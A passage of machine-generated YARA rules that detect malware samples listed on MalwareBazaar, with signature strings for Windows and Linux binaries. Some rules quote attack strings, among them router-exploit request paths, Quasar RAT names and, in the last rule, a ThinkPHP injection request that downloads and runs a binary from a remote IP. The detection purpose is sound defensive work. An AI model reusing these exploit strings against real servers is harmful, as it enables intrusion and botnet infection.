        $s12 = "rcMdeQ564rjS9295lxP"
        $s13 = "System.IO"
        $s14 = "CpHSEtNUlh7cXgWPC5u"
        $s15 = "<Module>{941BC601-8AC7-49D0-A032-53ECE3FA57A9}"
        $s16 = "System.Text"
        $s17 = "get_Length"
        $s18 = "get_Chars"
        $s19 = "System.Collections.Generic"
        $s20 = "System.Linq"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2109KB and
        all of them
}

rule Linux_94d6fc681bec3ea98634f2a830912ccfc827182fb7d0a4398a0c5c1fe7bf6ae9
{
    meta:
        description = "Auto ML: 94d6fc681bec3ea98634f2a830912ccfc827182fb7d0a4398a0c5c1fe7bf6ae9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 167KB and
        all of them
}

rule Windows_94df05071cad9595820a5132137d060b0d2d3cd122e5cad35a014d80a6bde02a
{
    meta:
        description = "Auto ML: 94df05071cad9595820a5132137d060b0d2d3cd122e5cad35a014d80a6bde02a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "httP"
        $s6 = "rJGEtxNm"
        $s7 = "Wint"
        $s8 = "ZGeTU"
        $s9 = "oWin"
        $s10 = "C/CmdkC"
        $s11 = "cMdw*"
        $s12 = "cMdK"
        $s13 = "vbCMDI("
        $s14 = "dowiN|"
        $s15 = "9geTg"
        $s16 = "<Module>"
        $s17 = "Writer"
        $s18 = "System"
        $s19 = "System.Collections.Generic"
        $s20 = "fileNames"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6617KB and
        all of them
}

rule Windows_94fca89e71f396bf1fd8f97ab027d6f64d443f6e3b8bc6ff259604401f78416b
{
    meta:
        description = "Auto ML: 94fca89e71f396bf1fd8f97ab027d6f64d443f6e3b8bc6ff259604401f78416b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Whirtles.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "ConnectionProvider"
        $s8 = "ConfigReader"
        $s9 = "FileScanning"
        $s10 = "FileSearcher"
        $s11 = "OpenVPN"
        $s12 = "System.Windows.Forms"
        $s13 = "QueryProcessor"
        $s14 = "QueryCmd"
        $s15 = "DownloadAndExecuteUpdate"
        $s16 = "DownloadUpdate"
        $s17 = "OpenUpdate"
        $s18 = "FileExt"
        $s19 = "UserExt"
        $s20 = "FileUtil"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 215KB and
        all of them
}

rule Windows_95015476fa2591987bbb360f77ed7211ba263044bd74b4f33ffbc3281f639b86
{
    meta:
        description = "Auto ML: 95015476fa2591987bbb360f77ed7211ba263044bd74b4f33ffbc3281f639b86"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "- unable to open console device"
        $s6 = "- unexpected multithread lock error"
        $s7 = "- not enough space for thread data"
        $s8 = "- floating point not loaded"
        $s9 = "GetLastActivePopup"
        $s10 = "GetActiveWindow"
        $s11 = "user32.dll"
        $s12 = "OLEAUT32.dll"
        $s13 = "ShowWindow"
        $s14 = "DestroyWindow"
        $s15 = "LoadStringA"
        $s16 = "LoadStringW"
        $s17 = "SetWindowTextA"
        $s18 = "SetWindowTextW"
        $s19 = "GetWindowLongA"
        $s20 = "SetWindowLongA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7453KB and
        all of them
}

rule Windows_95102aff67d60250cdfb95d2ec0a57a5872397ff350384ef3535ceabe7b5d27e
{
    meta:
        description = "Auto ML: 95102aff67d60250cdfb95d2ec0a57a5872397ff350384ef3535ceabe7b5d27e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6289KB and
        all of them
}

rule Windows_0f6fa3e9b6832c5d01c2c20fec6d8e791b6fd6af008cc63edb1014c2cb281647
{
    meta:
        description = "Auto ML: 0f6fa3e9b6832c5d01c2c20fec6d8e791b6fd6af008cc63edb1014c2cb281647"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6885KB and
        all of them
}

rule Windows_9581ec377f2622120a2ad56ef162c292c8fc5775cbc42ed3e8dbf565efca0d31
{
    meta:
        description = "Auto ML: 9581ec377f2622120a2ad56ef162c292c8fc5775cbc42ed3e8dbf565efca0d31"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4470KB and
        all of them
}

rule Windows_958e0b273ab024241617d2815b92ea517a0febd994e554fbf65fe62ea829b279
{
    meta:
        description = "Auto ML: 958e0b273ab024241617d2815b92ea517a0febd994e554fbf65fe62ea829b279"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.rsrc"
        $s6 = "System"
        $s7 = "Create"
        $s8 = "IOffset"
        $s9 = "ImplGetter"
        $s10 = "GetInterface"
        $s11 = "GetInterfaceEntry"
        $s12 = "GetInterfaceTable"
        $s13 = "GetHashCode"
        $s14 = "NewInstance"
        $s15 = "TMonitor.PWaitingThread"
        $s16 = "TMonitor.TWaitingThread"
        $s17 = "Thread"
        $s18 = "FOwningThread"
        $s19 = "SetSpinCount"
        $s20 = "tkSet"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 3162KB and
        all of them
}

rule Windows_9594160451608088b8e987328f0b13fb77d59bc99d27c4faad97e2ad834c5a65
{
    meta:
        description = "Auto ML: 9594160451608088b8e987328f0b13fb77d59bc99d27c4faad97e2ad834c5a65"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Require Windows"
        $s2 = ".text"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".rsrc"
        $s6 = "SetProcessPreferredUILanguages"
        $s7 = "SetThreadPreferredUILanguages"
        $s8 = "GetNativeSystemInfo"
        $s9 = "SFX module - Copyright (c) 2005-2016 Oleg Scherbakov"
        $s10 = "Could not get SFX filename."
        $s11 = "Could not open archive file \"%s\"."
        $s12 = "Could not read SFX configuration or configuration not found."
        $s13 = "Could not write SFX configuration."
        $s14 = "Could not create folder \"%s\"."
        $s15 = "Could not delete file or folder \"%s\"."
        $s16 = "Could not find \"setup.exe\"."
        $s17 = "\"setup.exe\""
        $s18 = "No \"HelpText\" in the configuration file."
        $s19 = "Could not create file \"%s\"."
        $s20 = "Could not overwrite file \"%s\"."
    condition:
        uint32(0) == 0x00605a4d and
        filesize < 858KB and
        all of them
}

rule Windows_95975615eb1d0194e9ed527770f247e241194a3ad66ae2294a8939a216ae3ad2
{
    meta:
        description = "Auto ML: 95975615eb1d0194e9ed527770f247e241194a3ad66ae2294a8939a216ae3ad2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
    condition:
        uint32(0) == 0x00805a4d and
        filesize < 37KB and
        all of them
}

rule Windows_95e15b50e1e8de17a0537512e7d84d479ab888ab75c314f73bda0ca764923861
{
    meta:
        description = "Auto ML: 95e15b50e1e8de17a0537512e7d84d479ab888ab75c314f73bda0ca764923861"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Resources"
        $s13 = "AssemblyKeyFileAttribute"
        $s14 = "installation_intelligence_with_autoselection.exe"
        $s15 = "<Module>"
        $s16 = "ThreadSafeObjectProvider`1"
        $s17 = "MySettings"
        $s18 = "ApplicationSettingsBase"
        $s19 = "System.Configuration"
        $s20 = "MySettingsProperty"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5675KB and
        all of them
}

rule Linux_95fcdb6e14ad59ce6ba178e7430aeea5b88ad06e41013681c7524bb430f9cc48
{
    meta:
        description = "Auto ML: 95fcdb6e14ad59ce6ba178e7430aeea5b88ad06e41013681c7524bb430f9cc48"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Sj`#YTS"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 35KB and
        all of them
}

rule Windows_960c58c5c9c3b495ca27e3e98f19c28a79ce1b6d1c998f1186bca090a7618df7
{
    meta:
        description = "Auto ML: 960c58c5c9c3b495ca27e3e98f19c28a79ce1b6d1c998f1186bca090a7618df7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Remote.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{77F1A536-9A3D-4E64-9E11-E419CF882C1A}"
        $s15 = "<Module>{fc389fa4-1fca-4a09-b722-96af96f52cb9}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.IO"
        $s19 = "Module"
        $s20 = "System.Collections"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 504KB and
        all of them
}

rule Windows_96145fa7973c4ff3a51dc56f8c52ec7b8265f70c84042907331b56328df778f6
{
    meta:
        description = "Auto ML: 96145fa7973c4ff3a51dc56f8c52ec7b8265f70c84042907331b56328df778f6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "Numbers in the file:"
        $s7 = "Unable to open file."
        $s8 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p."
        $s9 = "_Unwind_Resume"
        $s10 = "DeleteCriticalSection"
        $s11 = "GetLastError"
        $s12 = "SetUnhandledExceptionFilter"
        $s13 = "TlsGetValue"
        $s14 = "__getmainargs"
        $s15 = "__set_app_type"
        $s16 = "__setusermatherr"
        $s17 = "fwrite"
        $s18 = "_ZNSt14basic_ifstreamIcSt11char_traitsIcEE5closeEv"
        $s19 = "_ZNSt14basic_ifstreamIcSt11char_traitsIcEE7is_openEv"
        $s20 = "_ZNSt14basic_ifstreamIcSt11char_traitsIcEEC1EPKcSt13_Ios_Openmode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 139KB and
        all of them
}

rule Windows_961a589be9f24446f3b01ea426bc975ab09c158c9ff0888cdef81fcdb596d818
{
    meta:
        description = "Auto ML: 961a589be9f24446f3b01ea426bc975ab09c158c9ff0888cdef81fcdb596d818"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s7 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s9 = "Failed to extract %s: failed to read data chunk!"
        $s10 = "fread"
        $s11 = "Failed to extract %s: failed to write data chunk!"
        $s12 = "fwrite"
        $s13 = "Failed to extract %s: failed to open archive file!"
        $s14 = "pyi_arch_extract2fs was called before temporary directory was initialized!"
        $s15 = "Failed to create symbolic link %s!"
        $s16 = "Failed to extract %s: failed to open target file!"
        $s17 = "fopen"
        $s18 = "Failed to read cookie!"
        $s19 = "Could not read full TOC!"
        $s20 = "Error on file."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7166KB and
        all of them
}

rule Windows_961d929428efdaa00180f64acc9a601ab764b8ee4cc16753bf349a69b0d081bf
{
    meta:
        description = "Auto ML: 961d929428efdaa00180f64acc9a601ab764b8ee4cc16753bf349a69b0d081bf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 313KB and
        all of them
}

rule Linux_0f709f8e918c2796fdc46c078c526551c44309c1de16d215bd499a14a565c809
{
    meta:
        description = "Auto ML: 0f709f8e918c2796fdc46c078c526551c44309c1de16d215bd499a14a565c809"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "No such file or directory"
        $s2 = "No such process"
        $s3 = "Interrupted system call"
        $s4 = "Bad file descriptor"
        $s5 = "No child processes"
        $s6 = "Resource temporarily unavailable"
        $s7 = "File exists"
        $s8 = "Too many open files in system"
        $s9 = "Too many open files"
        $s10 = "Text file busy"
        $s11 = "File too large"
        $s12 = "Read-only file system"
        $s13 = "File name too long"
        $s14 = "Level 3 reset"
        $s15 = "Bad font file format"
        $s16 = "Multihop attempted"
        $s17 = "File descriptor in bad state"
        $s18 = "Attempting to link in too many shared libraries"
        $s19 = "Interrupted system call should be restarted"
        $s20 = "Too many users"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 152KB and
        all of them
}

rule Windows_961db0c18fc8e1e0c1b7f8f0da3db4a1ecc2533d0a6159c1de01640db7925315
{
    meta:
        description = "Auto ML: 961db0c18fc8e1e0c1b7f8f0da3db4a1ecc2533d0a6159c1de01640db7925315"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4469KB and
        all of them
}

rule Windows_964aa781e5758bb5640773c844220b9771f66e6482d7d63749def2f1abcaf08b
{
    meta:
        description = "Auto ML: 964aa781e5758bb5640773c844220b9771f66e6482d7d63749def2f1abcaf08b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "Spgfe.exe"
        $s4 = "<Module>"
        $s5 = "System"
        $s6 = "<Module>{08aa676d-d75d-41d5-8e46-5c9c8406bdb5}"
        $s7 = "GetTypeFromHandle"
        $s8 = "CreateDelegate"
        $s9 = "System.Reflection"
        $s10 = "Load"
        $s11 = "GetTypes"
        $s12 = "WriteProxy"
        $s13 = "CreateCollection"
        $s14 = "System.Net"
        $s15 = "set_SecurityProtocol"
        $s16 = "ConnectProxy"
        $s17 = "DownloadData"
        $s18 = "GetProxy"
        $s19 = "ReadProxy"
        $s20 = "System.Runtime.CompilerServices"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17KB and
        all of them
}

rule Windows_968cafa7d216f33478546a89a8d5c4754351e7f537bc50910f7f9c25d152e764
{
    meta:
        description = "Auto ML: 968cafa7d216f33478546a89a8d5c4754351e7f537bc50910f7f9c25d152e764"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win64"
        $s2 = ".rsrc"
        $s3 = "System"
        $s4 = "cwine_get_vB"
        $s5 = "mqAGeT"
        $s6 = "(kernel32.d"
        $s7 = "IME~WMAPI.DLL"
        $s8 = "RSET"
        $s9 = "<asmv3:windowsSettings>"
        $s10 = "<dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true/pm</dpiAware>"
        $s11 = "<dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2</dpiAwareness>"
        $s12 = "</asmv3:windowsSettings>"
        $s13 = "type=\"win32\""
        $s14 = "name=\"Microsoft.Windows.Common-Controls\""
        $s15 = "processorArchitecture=\"*\"/>"
        $s16 = "<!--The ID below indicates app support for Windows Vista -->"
        $s17 = "<!--The ID below indicates app support for Windows 7 -->"
        $s18 = "<!--The ID below indicates app support for Windows 8 -->"
        $s19 = "<!--The ID below indicates app support for Windows 8.1 -->"
        $s20 = "<!--The ID below indicates app support for Windows 10 -->"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 1656KB and
        all of them
}

rule Windows_96a244b32e73bac08510839a1137c41941ff4b18b1171c9fde09d0603b2477a7
{
    meta:
        description = "Auto ML: 96a244b32e73bac08510839a1137c41941ff4b18b1171c9fde09d0603b2477a7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Windows_972a96f02c44e04dfd1e329aefb50194456f051c7c37c8a507be18869e4c026b
{
    meta:
        description = "Auto ML: 972a96f02c44e04dfd1e329aefb50194456f051c7c37c8a507be18869e4c026b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB and
        all of them
}

rule Windows_9744b215300c01b5e7f18199287b2b898bb1a8a7d3b01f9acea6eb6069c62f1f
{
    meta:
        description = "Auto ML: 9744b215300c01b5e7f18199287b2b898bb1a8a7d3b01f9acea6eb6069c62f1f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 291KB and
        all of them
}

rule Windows_974b705980668b3d9fd809501c581d7961db4a43304826edf136764c789a28b1
{
    meta:
        description = "Auto ML: 974b705980668b3d9fd809501c581d7961db4a43304826edf136764c789a28b1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "System.Runtime.CompilerServices"
        $s4 = "System"
        $s5 = "Santaa.exe"
        $s6 = "<Module>"
        $s7 = "uNCBVkfOyKsCMDyYGAqODKFprWPlNDvqCBhdIxBNVxpGsYUsQrpGti"
        $s8 = "ubGOrswmluoXhHUeHKMVwLSGmXllPZWkJcMDkMYqYEfXhwKhvVKxexXiJAcTHKXLXDNFuRuvlVxrgu"
        $s9 = "bkSKZkRVZRUpSzVyepOgieofgDLwdHqgTJFddwiNQFHfxExvpEwVr"
        $s10 = "uteWRJhMCXCZjAaoNGMQqnhICtSEtiaubbHbyMkUAopwDTtj"
        $s11 = "nfOCmdawCaYlIDSCtDUMzyDUEWbjrDVanlHGKUrKkwTSZEgaXlrpG"
        $s12 = "nsqGWsopCpwbknUOitsylFVjCYdZAXclJZdeBwhCPQgTzBlflFmudVdhWHDxPOpeNLSKKpNmMpjVYBjAmxnvlhInv"
        $s13 = "NcylBImJQYGbKypljapLOLiLjLciEZNNwRHzfeWIjqZaotGvwifrLdrBumBqfDFqKsetrpGFDhcYmHWpEh"
        $s14 = "uaRldjeDwxwTocpFizShahqCMDdqWxcZnOTtywSAlzoRtzukwWVERJpMjPZaFohyVXgZIwHmhSwbtYIMJttAbXHdYHJjWrvwS"
        $s15 = "zoWBiWInTaLzzdfCOyLUIdPNrPL"
        $s16 = "<Module>{57472DFF-7CC9-4FA9-ABA2-94527EA4B532}"
        $s17 = "System.Net"
        $s18 = "DownloadData"
        $s19 = "System.IO"
        $s20 = "GetTempPath"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 349KB and
        all of them
}

rule Windows_975c4ebf786941650ee40d182564b157ea7656befa2a343cccff3c4952fedbda
{
    meta:
        description = "Auto ML: 975c4ebf786941650ee40d182564b157ea7656befa2a343cccff3c4952fedbda"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4606KB and
        all of them
}

rule Linux_97aa06c4caa77bd486f4a6a4aa59194de536ff9787cb6f845d1135eb289a20eb
{
    meta:
        description = "Auto ML: 97aa06c4caa77bd486f4a6a4aa59194de536ff9787cb6f845d1135eb289a20eb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://141.98.10.85/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
